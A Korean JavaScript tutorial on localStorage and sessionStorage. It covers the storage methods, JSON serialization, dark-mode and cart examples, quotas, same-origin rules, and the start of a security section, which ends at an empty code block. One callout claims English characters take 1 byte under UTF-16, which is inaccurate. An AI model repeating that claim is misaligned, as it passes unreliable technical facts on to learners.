---
title: "5-5 로컬 스토리지로 데이터 저장하기"
status: "completed"
description: "localStorage·sessionStorage의 개념과 메서드, JSON 직렬화, 저장 용량과 보안, storage 이벤트, 쿠키와의 비교까지 클라이언트 저장소를 정리한다."
category: "JavaScript"
section: "Async"
tags:
  - javascript
  - web-storage
  - local-storage
---

<style>
.wda-callout{border-radius:10px;padding:12px 14px;margin:.8rem 0 1.1rem;border-left:3px solid;font-size:.9rem;line-height:1.75}
.wda-ci{background:rgba(139,92,246,.06);border-color:#8b5cf6}
.wda-cw{background:rgba(245,158,11,.07);border-color:#f59e0b}
.wda-cs{background:rgba(34,197,94,.05);border-color:#22c55e}
.wda-cy{background:rgba(250,204,21,.07);border-color:#ca8a04}
.wda-clabel{font-size:.7rem;font-weight:700;letter-spacing:.06em;text-transform:uppercase;margin-bottom:6px;display:block}
.wda-ci .wda-clabel{color:#8b5cf6}
.wda-cw .wda-clabel{color:#f59e0b}
.wda-cs .wda-clabel{color:#22c55e}
.wda-cy .wda-clabel{color:#92400e}
.wda-goal{background:rgba(34,197,94,.05);border:1px solid rgba(34,197,94,.2);border-radius:10px;padding:12px 16px;margin:.8rem 0 1.6rem;font-size:.83rem;line-height:1.75}
.wda-fgrid{display:flex;flex-wrap:wrap;gap:10px;margin:.8rem 0 1.6rem}
.wda-fcard{flex:1 1 140px;border:1px solid rgba(128,128,128,.18);border-radius:10px;padding:13px 15px;background:rgba(128,128,128,.03);box-shadow:0 1px 3px rgba(0,0,0,.04)}
.wda-fcard-ico{font-size:1.3rem;margin-bottom:6px}
.wda-fcard-ttl{font-size:.94rem;font-weight:700;margin-bottom:4px}
.wda-fcard-dsc{font-size:.89rem;line-height:1.65}
.wda-fcard-pro{border-left:3px solid rgba(34,197,94,.22);background:rgba(34,197,94,.02)}
.wda-steps{border:1px solid rgba(128,128,128,.15);border-radius:10px;overflow:hidden;margin:.8rem 0 1.6rem}
.wda-step{display:flex;align-items:flex-start;gap:14px;padding:12px 16px;border-bottom:1px solid rgba(128,128,128,.1)}
.wda-step:last-child{border-bottom:none}
.wda-snum{min-width:26px;height:26px;border-radius:50%;background:rgba(245,158,11,.15);color:#f59e0b;font-size:.78rem;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
.wda-sbody{flex:1;min-width:0}
.wda-sttl{font-size:.94rem;font-weight:700;margin-bottom:4px}
.wda-sdsc{font-size:.89rem;line-height:1.65}
.wda-compare{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:.8rem 0 1.6rem}
@media(max-width:600px){.wda-compare{grid-template-columns:1fr}}
.wda-compare-card{border:1px solid rgba(128,128,128,.18);border-radius:10px;padding:14px 16px;background:rgba(128,128,128,.03);box-shadow:0 1px 3px rgba(0,0,0,.04)}
.wda-compare-ttl{font-size:.94rem;font-weight:700;margin-bottom:8px}
.wda-compare-label{font-size:.7rem;font-weight:700;letter-spacing:.04em;text-transform:uppercase;opacity:.65;margin-bottom:4px}
.wda-summary-table{width:100%;border-collapse:collapse;font-size:.83rem;margin:.8rem 0 1.4rem}
.wda-summary-table th,.wda-summary-table td{border:1px solid rgba(128,128,128,.2);padding:8px 12px;vertical-align:top;line-height:1.65}
.wda-summary-table th{background:rgba(139,92,246,.08);font-weight:700;text-align:left;white-space:nowrap}
.wda-summary-table td:first-child{font-weight:700;white-space:nowrap;width:150px}
tr:nth-child(even) td{background:rgba(128,128,128,.025)}
.wda-callout p{margin:0 0 .45rem;font-size:.9rem;line-height:1.75}
.wda-callout p:last-child{margin-bottom:0}
.wda-callout ul{margin:.35rem 0 0;padding-left:1.1rem}
.wda-callout li{margin:.24rem 0;line-height:1.75;font-size:.83rem}
.wda-deco{position:absolute;z-index:2;pointer-events:none}
@media (max-width:640px){
.wda-deco{width:34px !important}
}
p:has(> strong:only-child){margin-top:2.2rem !important;margin-bottom:.2rem !important}
p:has(> strong:only-child)+p,p:has(> strong:only-child)+ul,p:has(> strong:only-child)+ol,p:has(> strong:only-child)+div,p:has(> strong:only-child)+pre{margin-top:.15rem !important}
.wda-check-note{border:1px dashed rgba(128,128,128,.22);border-radius:8px;padding:14px 18px;background:rgba(128,128,128,.03);margin:.8rem 0 1.6rem;color:#2C2840}
.wda-check-note ul{list-style:none;margin:0;padding:0}
.wda-check-note li{position:relative;padding-left:1.4rem;margin:.4rem 0;font-size:.89rem;line-height:1.65}
.wda-check-note li::before{content:"✓";position:absolute;left:0;top:0;color:#6FB6C9;font-weight:700}
.wda-check-note strong{color:#1F1B2E;font-weight:700}
.wda-mistake-notes{display:flex;flex-direction:column;gap:8px;margin:.8rem 0 1.6rem}
.wda-mistake-note{border:1px solid #F6CFA8;border-radius:6px;padding:10px 14px;background:#FFF3E8}
.wda-mistake-wrong{font-size:.87rem;line-height:1.6;color:#C98245;text-decoration:line-through;text-decoration-color:#C98245;margin-bottom:4px}
.wda-mistake-right{font-size:.89rem;line-height:1.65;font-weight:600;color:#2C2840}
.wda-mistake-right strong{color:#1F1B2E;font-weight:700}
.wda-formula-board{display:flex;flex-wrap:wrap;gap:10px;margin:.8rem 0 1.6rem;padding:14px;border-radius:12px;background:rgba(128,128,128,.025);border:1px dashed rgba(128,128,128,.22)}
.wda-formula-block{flex:1 1 160px;min-width:150px;border-radius:8px;padding:10px 13px;background:#FFF3F6;border:1px dashed #F0B4C2}
.wda-formula-block-ttl{font-size:.72rem;font-weight:700;letter-spacing:.03em;text-transform:uppercase;color:#D86F8A;margin-bottom:6px}
.wda-formula-block-body{font-size:.87rem;line-height:1.7;font-weight:600;color:#2C2840}
.wda-formula-block-body code{background:transparent;padding:0;font-weight:700;font-family:'JetBrains Mono','Fira Code',monospace;color:#1F1B2E}
.wda-flip-deck{display:flex;flex-wrap:wrap;gap:12px;margin:.8rem 0 1.6rem}
</style>

## 🎯 학습 목표

<div class="wda-goal" style="position:relative;overflow:visible;">
  • <strong>Web Storage API</strong> — 클라이언트 저장소의 **개념과 필요성**을 이해합니다.<br>
  • <strong>수명과 범위</strong> — localStorage와 sessionStorage의 **데이터 유지 기간 차이**를 구분합니다.<br>
  • <strong>JSON 직렬화</strong> — 객체 데이터를 저장하기 위해 **문자열로 변환**하는 방법을 익힙니다.<br>
  • <strong>실무 활용</strong> — 다크 모드 설정이나 장바구니 같은 **실제 기능**을 구현합니다.
</div>

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>1. 클라이언트 사이드 저장소 (Client Side Storage)</h2>
</div>

**브라우저에 데이터를 저장하는 기술**

**📌 왜 필요할까요? (Why)**

서버에 저장하는 것과 달리 클라이언트 저장소만이 가지는 **특별한 장점**들입니다.

<div class="wda-fgrid">
  <div class="wda-fcard wda-fcard-pro">
    <div class="wda-fcard-ttl">데이터 유지 (Persistence)</div>
    <div class="wda-fcard-dsc">새로고침을 하거나 브라우저를 껐다 켜도 <strong>데이터가 사라지지 않고 유지</strong>됩니다. 휘발성인 세션이나 용량이 적은 쿠키와는 다릅니다.</div>
  </div>
  <div class="wda-fcard wda-fcard-pro">
    <div class="wda-fcard-ttl">서버 부하 감소 (Reduce Load)</div>
    <div class="wda-fcard-dsc">서버 DB를 거치지 않고 <strong>브라우저 내부에 데이터를 저장</strong>합니다. 불필요한 서버 요청(API Call)을 줄여 서버 비용을 아끼고 속도를 높입니다.</div>
  </div>
  <div class="wda-fcard wda-fcard-pro">
    <div class="wda-fcard-ttl">오프라인 작동 (Offline)</div>
    <div class="wda-fcard-dsc">인터넷 연결이 끊긴 상태에서도 데이터를 저장하고 불러올 수 있습니다. PWA(웹 앱) 구현 시 필수적인 요소입니다.</div>
  </div>
  <div class="wda-fcard wda-fcard-pro">
    <div class="wda-fcard-ttl">개인화 (Personalization)</div>
    <div class="wda-fcard-dsc">다크 모드, 언어 설정 등 <strong>사용자별 고유한 선호도(Preference)</strong>를 기억하는 데 최적화되어 있습니다.</div>
  </div>
</div>

**🔹 쿠키(Cookie)와의 차이점**

<div class="wda-compare">
  <div class="wda-compare-card">
    <div class="wda-compare-ttl">쿠키</div>
    매번 서버로 전송됨(트래픽 발생), 용량 작음(4KB), 만료 기한 있음.
  </div>
  <div class="wda-compare-card">
    <div class="wda-compare-ttl">Web Storage</div>
    클라이언트에만 존재(서버 전송 X), 용량 큼(5MB), (로컬스토리지의 경우) 브라우저를 꺼도 유지되는 저장소.
  </div>
</div>

localStorage는 일반적으로 브라우저를 껐다 켜도 유지되는 저장소입니다.  
다만 사용자가 직접 삭제하거나, 브라우저 정책·시크릿 모드·저장소 정리 정책에 따라 사라질 수 있으므로 절대적인 영구 저장소로 보지는 않아야 합니다.

**💡 대표적 활용 (Use Cases)**

실무에서 주로 다음과 같은 기능을 구현할 때 사용합니다.

| **활용 사례** | **설명** |
| --- | --- |
| **다크모드 설정** | 사용자가 선택한 화면 모드(Light/Dark)를 기억합니다. |
| **장바구니** | 로그인하지 않은 상태에서도 장바구니에 담은 상품을 유지합니다. |
| **임시 저장** | 긴 글이나 폼을 작성하던 중 날아가지 않게 임시로 저장합니다. |
| **최근 검색어** | 사용자가 검색했던 키워드 기록을 저장합니다. |

**📌 저장 위치 및 특징 (Location & Specs)**

데이터가 실제로 저장되는 공간과 기술적 특징입니다.

| **특징** | **상세 내용 및 설명** |
| --- | --- |
| **위치**(Location) | 브라우저 내부에 마련된 **별도의 물리적 저장 공간**입니다. |
| **격리**(Isolation) | **각 도메인(주소)별로 철저히 분리**되어 저장됩니다.<br>(예: `naver.com`의 저장소를 `google.com`이 절대 볼 수 없음) |
| **형태**(Format) | 오직 **문자열(String)** 형태의 데이터만 저장 가능합니다.<br>(객체나 배열은 문자열로 변환해야 함) |
| **용량**(Capacity) | 도메인당 **약 5MB**까지 넉넉하게 저장 가능합니다.<br>(쿠키는 4KB로 텍스트 파일 하나 정도 크기에 불과함) |

**🔹 문자열만 저장된다고요?**

네, `localStorage`에는 숫자 `1`을 넣어도 문자 `"1"`로 저장됩니다.  
그래서 객체(`{name: "kim"}`)를 저장할 때는 반드시 **`JSON.stringify()`**로 문자열로 바꾸고, 꺼낼 때는 **`JSON.parse()`**로 다시 객체로 조립해야 합니다.

**💡 보충 설명**

<div class="wda-callout wda-ci">
  <strong>내 눈으로 직접 확인하기</strong> — 개발자라면 내 브라우저에 뭐가 저장되어 있는지 볼 수 있어야 합니다.<br>
  1. <code>F12</code>를 눌러 개발자 도구를 엽니다.<br>
  2. 상단 탭 중 <strong><code>Application</code></strong> 탭을 클릭합니다. (안 보이면 <code>&gt;&gt;</code> 버튼 클릭)<br>
  3. 좌측 메뉴의 <strong><code>Storage</code></strong> ➡ <strong><code>Local Storage</code></strong>를 클릭하면 현재 사이트가 저장한 데이터가 보입니다.
</div>

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>2. Storage 메서드 (Storage Methods)</h2>
</div>

**데이터를 관리(CRUD)하는 5가지 핵심 도구**

**📝 주요 메서드 (Key Methods)**

데이터를 넣고, 빼고, 지우는 기본적인 명령어들입니다.

| **메서드 (Method)** | **역할** | **설명** |
| --- | --- | --- |
| **`setItem(key, value)`** | **저장하기** 📥 | • 키(key)와 값(value)을 쌍으로 저장합니다.<br>• 이미 있는 키라면 새로운 값으로 **덮어씁니다(Update).** |
| **`getItem(key)`** | **가져오기** 📤 | • 키에 해당하는 값을 찾아 반환합니다.<br>• 만약 키가 존재하지 않으면 **`null`**을 반환합니다. |
| **`removeItem(key)`** | **삭제하기** 🗑️ | • 특정 키를 가진 데이터 하나만 콕 집어서 삭제합니다. |
| **`clear()`** | **전체 삭제** 💣 | • 저장소에 있는 **모든 데이터를 싹 지웁니다.** (사용 시 주의!) |
| **`length` / `key(n)`** | **정보 조회** ℹ️ | • `length`: 저장된 항목의 총개수<br>• `key(n)`: n번째 인덱스에 있는 키의 이름 |

**🧪 코드 예제 (Code Example)**

<div style="position:relative;overflow:visible;">

```js
// 1. 저장하기 (Create/Update)
// 'name'이라는 키에 '홍길동' 저장
localStorage.setItem('name', '홍길동');
localStorage.setItem('age', '25'); // 숫자를 넣어도 자동으로 문자열 "25"로 저장됨

// 2. 가져오기 (Read)
const name = localStorage.getItem('name');
console.log(name); // "홍길동"

// 없는 키를 찾을 때
const job = localStorage.getItem('job');
console.log(job); // null (에러가 나지 않고 null을 줍니다)

// 3. 삭제하기 (Delete)
localStorage.removeItem('age'); // 'age' 데이터만 삭제

// 4. 전체 삭제 (Clear)
localStorage.clear(); // 모든 데이터가 초기화됨
```

</div>

**💡 보충 설명**

<div class="wda-callout wda-ci">
  <strong>sessionStorage도 똑같나요?</strong> — 네, 위 코드에서 localStorage 부분만 sessionStorage로 바꾸면 똑같이 동작합니다. (예: <code>sessionStorage.setItem('key', 'value')</code>)<br><br>
  <strong>주의할 점: 문자열만 취급</strong> — 앞서 배웠듯이 숫자를 넣어도 문자열로 바뀌어 저장됩니다. 만약 객체(<code>{...}</code>)를 그대로 넣으면 <code>[object Object]</code>라는 알 수 없는 문자가 저장되므로, 다음 장에서 배울 JSON 변환이 필수입니다.
</div>

<div class="wda-callout wda-cw">
  <code>clear()</code>는 현재 origin의 localStorage 데이터를 전부 지웁니다. 실무에서는 필요한 키만 <code>removeItem()</code>으로 지우는 것이 더 안전합니다.
</div>

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>3. SessionStorage 사용법</h2>
</div>

**"localStorage와 쌍둥이지만, 성격(수명)만 다릅니다."**

**🧪 예시 코드**

메서드 이름 앞의 객체만 `sessionStorage`로 바꾸면 됩니다.

```js
// 1. 저장하기 (탭을 닫으면 이 데이터는 즉시 사라짐)
sessionStorage.setItem('isLogin', 'true');

// 2. 가져오기 (현재 탭에서만 유효함)
const isLogin = sessionStorage.getItem('isLogin');

// 3. 삭제하기 (특정 키 삭제)
sessionStorage.removeItem('isLogin');

// 4. 전체 삭제 (현재 탭의 저장소 초기화)
sessionStorage.clear();
```

**⚠️ 주의사항 (Cautions)**

`localStorage`와 달리 **'탭(Tab)'**을 기준으로 동작한다는 점을 명심해야 합니다.

<div class="wda-callout wda-cw">
  <strong>새 탭 공유 안 됨</strong> ❌ — 같은 웹사이트(<code>naver.com</code>)를 새 탭으로 하나 더 열어도, 기존 탭의 세션 스토리지 데이터는 <strong>공유되지 않습니다.</strong> (각 탭마다 별개의 금고를 가집니다.)<br><br>
  <strong>탭 닫으면 증발</strong> ❌ — 브라우저 전체를 끄지 않아도, <strong>해당 탭만 닫으면</strong> 데이터는 영구적으로 삭제되어 복구할 수 없습니다.
</div>

**💡 보충 설명**

<div class="wda-callout wda-ci">
  <strong>언제 쓰면 좋을까요?</strong> — sessionStorage는 탭을 닫으면 사라지는 임시 데이터에 적합합니다. 예: 작성 중인 폼 데이터, 일회성 UI 상태, 결제 단계의 임시 진행 상태 등<br><br>
  단, <strong>로그인 토큰처럼 탈취되면 위험한 정보는 sessionStorage에도 저장하지 않는 것이 안전합니다.</strong> 인증 정보는 가능한 한 <strong>HttpOnly Cookie</strong> 같은 더 안전한 방식을 사용하는 것이 좋습니다.
</div>

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>4. 주의: 동기적 실행 (Synchronous Execution)</h2>
</div>

**"저장에 시간이 걸리면, 화면이 멈춥니다!"**

**⚠️ Blocking UI (화면 멈춤 현상)**

Web Storage의 모든 작업(`setItem`, `getItem` 등)은 **동기적(Synchronous)**으로 처리됩니다.

| **구분** | **상세 내용** | **사용자 체감** |
| --- | --- | --- |
| **작동 원리** | 저장/조회 작업이 끝날 때까지 브라우저는 **모든 동작을 멈추고 대기**합니다. | "화면이 잠깐 멈춘 것 같은데?" |
| **데이터가 작을 때** | 0.001초 미만으로 매우 빠르게 처리됩니다. | 전혀 느끼지 못함 (문제없음) |
| **데이터가 클 때** | 처리 시간이 길어지며 브라우저가 **'일시 정지'** 상태가 됩니다. | **"어? 클릭이 안 되네?"** (버벅거림) |

**💡 요리사 비유 (Analogy)**

이 상황을 식당에 비유하면 다음과 같습니다.

| **상황 (Context)** | **비유 내용 (Analogy)** | **기술적 해석** |
| --- | --- | --- |
| **상황** | 한창 요리(렌더링) 중인 요리사에게 **"냉장고 정리(Storage 저장) 좀 해줘"**라고 시킵니다. | UI 렌더링 중에 `setItem` 호출 |
| **결과** | 요리사는 몸이 하나뿐이라서, **요리를 멈추고** 냉장고 정리부터 하러 갑니다. | **싱글 스레드**라서 작업을 멈춤 |
| **피해** | 그동안 손님(사용자)은 요리가 나올 때까지 **멍하니 기다려야** 합니다. | **Blocking UI** (화면 프리징) 발생 |

**💡 성능 팁 (Performance Tip)**

앱 성능을 떨어뜨리지 않으려면 다음 규칙을 지켜야 합니다.

| **규칙 (Rule)** | **권장 사항 및 이유** |
| --- | --- |
| **용량 제한** | • 수백 KB 이상의 **너무 큰 데이터**는 저장하지 마세요.<br>• 텍스트 위주의 가벼운 설정값 저장에 최적화되어 있습니다. |
| **빈도 제한** | • 너무 자주 썼다 지웠다 반복하면 **버벅거림(Frame Drop)**이 발생합니다.<br>• 꼭 필요할 때만 저장하세요. |
| **대안 사용** | • 대용량 데이터를 저장해야 한다면,<br>• **비동기(Async)**로 작동하여 화면을 멈추지 않는 **IndexedDB**를 사용하세요. |

**💡 보충 설명**

<div class="wda-callout wda-ci">
  <strong>동기(Sync) vs 비동기(Async)</strong><br>
  • <strong>동기(Storage)</strong>: "이거 다 할 때까지 꼼짝 마!" (줄 서서 기다림)<br>
  • <strong>비동기(IndexedDB)</strong>: "이거 맡겨둘 테니까 나중에 알려줘, 난 다른 일 할게." (번호표 받고 딴짓 가능)
</div>

**💼 실무 팁**

<div class="wda-callout wda-cs">
  일반적인 텍스트 설정값, 토큰, 장바구니 리스트 정도는 용량이 매우 작아서 <code>localStorage</code>를 써도 성능에 전혀 문제가 없습니다. <strong>이미지 파일 자체</strong>나 <strong>거대한 게시글 목록</strong> 등을 통째로 넣을 때만 조심하면 됩니다.
</div>

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>5. JSON 직렬화/역직렬화</h2>
</div>

**📌 객체 저장의 핵심 원칙**

- **기본 제약**: 로컬 스토리지는 오직 **문자열(String)**만 저장할 수 있습니다.
- **❌ 잘못된 방법**: 객체(`{...}`)를 그대로 저장하려고 하면, 데이터가 깨져서 `[object Object]`라는 알 수 없는 문자로 저장됩니다.
- **✅ 올바른 방법**: 객체를 저장하기 전에 반드시 **문자열로 변환(직렬화)**해야 하고, 꺼내 쓸 때는 다시 **객체로 복구(역직렬화)**해야 합니다.

**📝 핵심 함수 2가지**

| **함수** | **설명 (기능)** | **용도** | **예시** |
| --- | --- | --- | --- |
| **JSON.stringify()** | **직렬화**<br>객체를 문자열로 바꿉니다. | **저장할 때** | `{ a: 1 }` → `'{"a":1}'` |
| **JSON.parse()** | **역직렬화**<br>문자열을 다시 객체로 바꿉니다. | **불러올 때** | `'{"a":1}'` → `{ a: 1 }` |

```js
const user = { name: '홍길동', age: 25 };

// ❌ [실패] 객체를 그대로 저장하면 망함
localStorage.setItem('user', user);
// 꺼내보면 '[object Object]' 라고 나옴 😱

// ✅ [성공] JSON 문자열로 변환하여 저장 (직렬화)
localStorage.setItem('user', JSON.stringify(user));

// 🔄 [복구] 꺼낸 문자열을 다시 객체로 변환 (역직렬화)
const savedString = localStorage.getItem('user');
const savedUser = JSON.parse(savedString);

console.log(savedUser.name); // '홍길동' (성공!)
```

**⚠️ 주의사항 (에러 방지)**

<div class="wda-callout wda-cw">
  <strong>파싱 에러</strong> : <code>JSON.parse()</code> 안에 올바르지 않은 문자열(JSON 형식이 아닌 것)을 넣으면 에러가 발생하여 프로그램이 멈출 수 있습니다.<br>
  <strong>Tip</strong> : 항상 <code>try...catch</code> 문으로 감싸서 에러를 처리하는 것이 안전합니다.
</div>

**개념 정리**

<div class="wda-callout wda-ci">
  <strong>직렬화(Serialization)</strong> : 복잡한 데이터(객체, 배열 등)를 한 줄의 기차처럼 <strong>일렬로 나열된 문자열</strong>로 만드는 과정입니다. 마치 이사 갈 때 가구를 분해해서 상자에 넣는 것과 비슷합니다.<br><br>
  <strong>역직렬화(Deserialization)</strong> : 문자열로 된 데이터를 다시 원래의 사용할 수 있는 객체 형태로 조립하는 과정입니다. 이사 간 집에서 가구를 다시 조립하는 것과 같습니다.
</div>

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>🛠️ 실무 활용 : 다크모드 구현</h2>
</div>

**📝 구현 코드 (핵심 로직)**

- **기본 원리**: 버튼을 누를 때마다 테마 상태를 변경하고, 그 상태를 `localStorage`에 저장하여 **새로고침 해도 설정이 유지**되도록 합니다.
- **초기화 로직**: 페이지가 처음 로드될 때 저장된 설정이 있는지 확인하고, 없으면 기본값('light')을 적용합니다.

```js
// 1. 테마 적용 함수 (HTML body 태그에 클래스 부여)
function applyTheme(theme) {
  // className에 직접 대입하면 기존 클래스가 모두 덮어써지므로 classList로 안전하게 교체
  document.body.classList.remove('light', 'dark');
  document.body.classList.add(theme); // css에서 .dark 스타일이 적용됨
}

// 2. 테마 토글 함수 (버튼 클릭 시 실행)
function toggleTheme() {
  // 현재 저장된 테마 가져오기
  const current = localStorage.getItem('theme');

  // 테마 뒤집기 (dark면 light로, 아니면 dark로)
  const newTheme = current === 'dark' ? 'light' : 'dark';

  // 스토리지에 저장 및 화면 적용
  localStorage.setItem('theme', newTheme);
  applyTheme(newTheme);
}

// 3. 페이지 로드 시 저장된 테마 복원 (새로고침 해도 유지!)
// 저장된 게 없으면 'light'를 기본값으로 사용 (|| 연산자 활용)
const savedTheme = localStorage.getItem('theme') || 'light';
applyTheme(savedTheme);
```

**⚙️ 동작 흐름 (Flow)**

사용자가 버튼을 클릭했을 때 벌어지는 일련의 과정입니다.

<div class="wda-steps">
  <div class="wda-step">
    <div class="wda-snum">1</div>
    <div class="wda-sbody">
      <div class="wda-sttl">클릭</div>
      <div class="wda-sdsc">사용자가 '다크모드 전환' 버튼을 클릭합니다.</div>
    </div>
  </div>
  <div class="wda-step">
    <div class="wda-snum">2</div>
    <div class="wda-sbody">
      <div class="wda-sttl">함수 실행</div>
      <div class="wda-sdsc"><code>toggleTheme()</code> 함수가 실행됩니다.</div>
    </div>
  </div>
  <div class="wda-step">
    <div class="wda-snum">3</div>
    <div class="wda-sbody">
      <div class="wda-sttl">저장</div>
      <div class="wda-sdsc"><code>localStorage</code>에 <code>'dark'</code> (또는 <code>'light'</code>) 문자열을 저장합니다.</div>
    </div>
  </div>
  <div class="wda-step">
    <div class="wda-snum">4</div>
    <div class="wda-sbody">
      <div class="wda-sttl">적용</div>
      <div class="wda-sdsc">HTML <code>&lt;body&gt;</code> 태그에 <code>'dark'</code> 클래스를 추가하여 배경색과 글자색을 바꿉니다.</div>
    </div>
  </div>
  <div class="wda-step">
    <div class="wda-snum">5</div>
    <div class="wda-sbody">
      <div class="wda-sttl">유지</div>
      <div class="wda-sdsc">브라우저를 껐다 켜거나 새로고침을 해도, 3번에서 저장한 값 덕분에 다크모드가 유지됩니다.</div>
    </div>
  </div>
</div>

**📌 시스템 테마 감지 (심화 기능)**

사용자가 별도로 설정한 값이 없을 때, **운영체제(Windows/Mac)의 다크모드 설정**을 자동으로 따라가게 만드는 고급 기능입니다.

```js
// OS가 다크모드인지 확인하는 코드
const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;

// 우선순위 로직:
// 1. 저장된 테마가 있으면 그걸 씀
// 2. 없으면 OS 설정(prefersDark)을 따름
// 3. 그것도 아니면 'light'
const theme = localStorage.getItem('theme') || (prefersDark ? 'dark' : 'light');

applyTheme(theme);
```

**💡 보충 설명**

<div class="wda-callout wda-ci">
  <strong>`window.matchMedia`</strong> — CSS의 미디어 쿼리(<code>@media</code>)를 자바스크립트에서 쓸 수 있게 해주는 기능입니다.<br>
  사용자의 노트북이나 폰이 다크모드인지 알아낼 때 유용합니다.<br><br>
  <strong>`document.body.className`</strong> — 자바스크립트로 HTML 태그에 클래스 이름을 붙여주는 방식입니다.<br>
  CSS에 <code>.dark { background: black; color: white; }</code> 같은 코드가 미리 준비되어 있어야 색상이 실제로 바뀝니다.<br><br>
  <code>className</code>에 직접 대입하면 body에 있던 기존 클래스가 모두 덮어써질 수 있습니다.<br>
  실무에서는 <code>classList.add</code>/<code>remove</code>를 사용하는 방식이 더 안전합니다.
</div>

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>🛠️ 실무 활용: 장바구니</h2>
</div>

**📝 배열 데이터를 저장하고 관리하기**

- **핵심 목표**: 여러 개의 상품 정보를 담아야 하므로 단순 문자열이 아닌 **배열(Array)** 형태의 데이터를 관리해야 합니다.
- **구현 원리**:
  - 가져올 때: `getItem` 후 `JSON.parse()`로 배열 복구
  - 저장할 때: `JSON.stringify()`로 배열을 문자열로 변환

```js
// 1. 장바구니 가져오기 (Read)
function getCart() {
  const cart = localStorage.getItem('cart');

  // 데이터가 없으면 빈 배열([]) 반환하여 에러 방지
  if (!cart) return [];

  try {
    // 개발자 도구 등에서 값이 임의로 수정되어 JSON 형식이 깨졌을 수 있으므로 안전하게 파싱
    return JSON.parse(cart);
  } catch (error) {
    console.error('장바구니 데이터를 읽을 수 없습니다:', error);
    return [];
  }
}

// 2. 상품 추가 (Create/Update)
function addToCart(product) {
  const cart = getCart(); // 기존 장바구니 목록 불러오기
  cart.push(product);     // 배열에 새 상품 추가

  // 변경된 배열을 다시 문자열로 바꿔서 저장
  localStorage.setItem('cart', JSON.stringify(cart));
}

// 3. 상품 삭제 (Delete)
function removeFromCart(productId) {
  const cart = getCart();
  // 삭제하려는 상품 ID를 제외한 나머지들만 남김 (filter 활용)
  const filtered = cart.filter(item => item.id !== productId);

  // 걸러진 목록을 다시 저장
  localStorage.setItem('cart', JSON.stringify(filtered));
}
```

**🧪 사용 예시**

실제 코드에서 함수를 호출하여 상품을 넣고 빼는 과정입니다.

```js
// 상품 추가 테스트
addToCart({
  id: 1,
  name: '티셔츠',
  price: 29000
});

addToCart({
  id: 2,
  name: '청바지',
  price: 59000
});

// 장바구니 확인
console.log(getCart());
// 결과: [{ id: 1, ... }, { id: 2, ... }] (객체가 담긴 배열)

// 상품 삭제 테스트 (ID가 1인 티셔츠 삭제)
removeFromCart(1);
```

**💡 보충 설명**

<div class="wda-callout wda-ci">
  <strong>빈 배열(`[]`) 처리</strong> — 처음에 아무것도 저장하지 않은 상태에서 <code>JSON.parse(null)</code>을 하면 에러가 나지는 않지만 <code>null</code>이 됩니다. 배열 메서드(<code>push</code>, <code>filter</code>)를 바로 쓰기 위해, 데이터가 없으면 <code>[]</code>(빈 배열)을 반환하도록 처리하는 것이 실무 꿀팁입니다.<br><br>
  <strong>`filter` 함수</strong> — 원본 데이터를 직접 지우는 것보다, "내가 원하는 조건의 데이터만 남겨서 새로운 배열을 만드는 방식"이 데이터 불변성을 지키는 안전한 삭제 방법입니다.
</div>

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>6. 저장 용량과 범위</h2>
</div>

**📌 5MB의 한계**

| **구분** | **핵심 내용** |
| --- | --- |
| **용량 제한** | • 도메인당 약 **5MB**까지 저장 가능<br>• (브라우저별로 상이하며, 실제로는 4MB ~ 5MB 수준) |
| **에러 발생** | • 용량 초과 시 `QuotaExceededError`가 발생 |
| **저장 방식** | • 문자열(**UTF-16**)로 저장<br>• 영어/숫자 외의 문자가 포함되면 실제 데이터 크기보다 더 많은 용량을 차지함 |

```js
try {
  // 'bigData'라는 키로 아주 큰 데이터를 저장 시도
  localStorage.setItem('bigData', hugeString);
} catch (e) {
  // 에러가 발생했을 때(용량 초과 등) 실행되는 구간
  if (e.name === 'QuotaExceededError') {
    // 용량 초과 에러가 맞다면 사용자에게 알림
    alert('저장 공간이 부족합니다! 🧹');
  }
}
```

**📌 Same-Origin 정책**

**정의**: 오직 **같은 출처(Origin)**끼리만 데이터를 공유할 수 있는 보안 정책입니다.

| **비교** | **결과** |
| --- | --- |
| `https://a.com` ↔ `https://a.com` (출처 동일) | ✅ **허용** |
| `https://a.com` ↔ `https://b.com` (도메인이 다름) | ❌ **차단** |
| `http://a.com` ↔ `https://a.com` (프로토콜이 다름, http vs https) | ❌ **차단** |

**⚠️ 주의사항**

<div class="wda-callout wda-cw">
  서브 도메인(<code>sub.a.com</code>)도 부모 도메인(<code>a.com</code>)과 서로 다른 저장소를 가집니다.
</div>

**💡 보충 설명**

<div class="wda-callout wda-ci">
  <strong>UTF-16이란?</strong> — 컴퓨터가 문자를 저장하는 방식 중 하나입니다. 영어는 1바이트지만 한글이나 이모지 같은 특수 문자는 2바이트 이상을 차지하기 때문에, 5MB라고 해도 500만 자를 꽉 채워 쓸 수 있는 것은 아닙니다.<br><br>
  <strong>Origin(출처)의 3요소</strong> — 브라우저는 <strong>프로토콜(http/https)</strong>, <strong>도메인(주소)</strong>, <strong>포트 번호</strong> 이 세 가지가 모두 같아야 '같은 출처'라고 인정하고 창고 열쇠를 공유해 줍니다. 하나라도 다르면 보안상 남남으로 취급합니다.
</div>

---

<div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
  <h2>7. 보안 주의사항</h2>
</div>

**⚠️ 민감 정보 금지! (절대 저장하면 안 되는 데이터)**

| **구분** | **핵심 내용** |
| --- | --- |
| **위험성** | • **"Anything Public"**<br>• 브라우저 저장소는 `F12`(개발자 도구)만 누르면 누구나 내용을 볼 수 있음 |
| **저장 금지 항목** | • 비밀번호, 주민등록번호, 신용카드 정보<br>• **Access Token**(로그인 인증 토큰) 등 |
| **해킹 시나리오** | • 해커가 사이트에 심어둔 악성 코드가 실행되면 로컬 스토리지의 내용을 쉽게 훔쳐갈 수 있음 |

```js
